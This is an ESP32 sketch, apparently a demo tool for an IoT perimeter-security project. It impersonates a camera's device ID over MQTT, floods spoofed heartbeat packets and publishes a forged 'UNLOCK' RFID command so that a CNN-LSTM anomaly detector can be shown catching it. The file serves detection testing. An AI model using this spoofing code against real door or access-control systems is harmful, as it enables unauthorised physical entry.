/*
 * ATTACKER ESP32 — Demo Tool
 * Sends spoofed UNLOCK packets to simulate a network attack
 * This WILL be caught by the Pi's CNN-LSTM because timing is wrong
 */

#include <WiFi.h>
#include <PubSubClient.h>
#include <ArduinoJson.h>

// ─── CREDENTIALS (from config.h) ──────────────────────────────────────
#include "../perimeter_scanner/config.h"
// config.h defines: WIFI_SSID, WIFI_PASS, MQTT_BROKER, MQTT_PORT

#define ATTACK_BTN 0   // Boot button = attack trigger


WiFiClient   espClient;
PubSubClient mqtt(espClient);

void setup() {
  Serial.begin(115200);
  pinMode(ATTACK_BTN, INPUT_PULLUP);
  pinMode(2, OUTPUT);  // Onboard LED

  WiFi.begin(WIFI_SSID, WIFI_PASS);
  while (WiFi.status() != WL_CONNECTED) delay(500);
  Serial.println("✅ Attacker connected to WiFi");

  mqtt.setServer(MQTT_BROKER, MQTT_PORT);
  while (!mqtt.connect("ATTACKER_ESP32")) delay(1000);
  Serial.println("✅ Attacker connected to MQTT");
  Serial.println("Press BOOT button to launch attack...");
}

void loop() {
  mqtt.loop();

  if (digitalRead(ATTACK_BTN) == LOW) {
    digitalWrite(2, HIGH);

    // Spoof a legitimate heartbeat (OS-jitter will betray us)
    StaticJsonDocument<256> doc;
    doc["device_id"]          = "ESP32_CAM_PERIMETER_001";  // Stolen ID
    doc["timestamp"]          = millis();
    doc["inter_packet_delay"] = 498 + random(-50, 50);  // Fake timing
    doc["free_heap"]          = 240000 + random(-5000, 5000);
    doc["rssi"]               = -62 + random(-10, 10);
    doc["packet_size"]        = 245;

    char buf[256];
    serializeJson(doc, buf);

    // Spam 10 packets fast (attacker doesn't have camera delays)
    for (int i = 0; i < 10; i++) {
      mqtt.publish("perimeter/heartbeat", buf);
      delay(random(50, 200));  // OS scheduler jitter — CNN-LSTM will catch this
    }

    // Also send fake unlock command
    doc.clear();
    doc["device_id"] = "ESP32_CAM_PERIMETER_001";
    doc["rfid_uid"]  = "AABB1122";
    doc["command"]   = "UNLOCK";
    serializeJson(doc, buf);
    mqtt.publish("perimeter/rfid_scan", buf);

    Serial.println("💀 Attack packet sent! Watch the dashboard...");
    delay(2000);
    digitalWrite(2, LOW);
  }
}
